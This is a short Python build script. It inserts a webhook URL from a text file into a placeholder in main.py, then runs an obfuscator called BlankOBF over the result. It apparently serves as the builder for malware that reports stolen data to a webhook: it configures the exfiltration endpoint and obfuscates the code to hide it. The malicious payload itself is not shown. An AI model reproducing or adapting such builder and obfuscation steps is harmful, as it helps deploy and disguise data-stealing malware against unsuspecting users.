import subprocess
with open('webhook.txt') as file:
    webhook = file.read().strip()

with open('main.py') as file:
    code = file.readlines()

for index, value in enumerate(code):
    if 'faxxhookxxx' in value:
        code[index] = "WEBHOOK = '{}'".format(webhook)
        break

code = '\n'.join(code)
with open('main-o.py', 'w') as file:
    file.write(code)
subprocess.run('python BlankOBF.py main-o.py -o main-o.py', shell= True, capture_output= True)